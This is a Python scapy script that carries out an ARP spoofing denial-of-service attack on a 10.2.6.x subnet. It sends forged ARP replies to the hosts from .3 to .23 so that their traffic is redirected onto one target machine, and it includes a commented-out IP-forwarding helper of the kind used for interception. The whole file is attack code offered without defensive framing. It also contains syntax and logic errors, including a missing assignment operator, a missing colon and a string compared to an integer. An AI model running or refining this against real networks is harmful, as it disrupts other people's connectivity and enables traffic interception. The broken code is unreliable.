from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
        with open(file_path, "w") as f:
            print(1, file=f)

def get_mac(ip): 
    ans, _ srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def dos(target_ip):
    target_mac = get_mac(target_ip)
    for i in range(3, 24):
        dst_ip = '10.2.6.' + str(i)
        dst_mac = get_mac(dst_ip)
        print("Sending redirect to " + dst_ip + " with a determined MAC of " + str(dst_mac))
        for j in range(3, 24)
            if j is not i:
                spoofed_ip = '10.2.6.' + str(j)
                arp_response = ARP(pdst = dst_ip, hwdst = dst_mac, psrc = spoofed_ip, hwsrc = target_mac, op = 'is-at')
                send(arp_response, verbose=0, count=7)

if __name__ == "__main__":
    #enable_linux_iproute()
    target = '10.2.6.2'
    try:
        dos(target)
    except KeyboardInterrupt:
        print("Keyboard interrupt detected")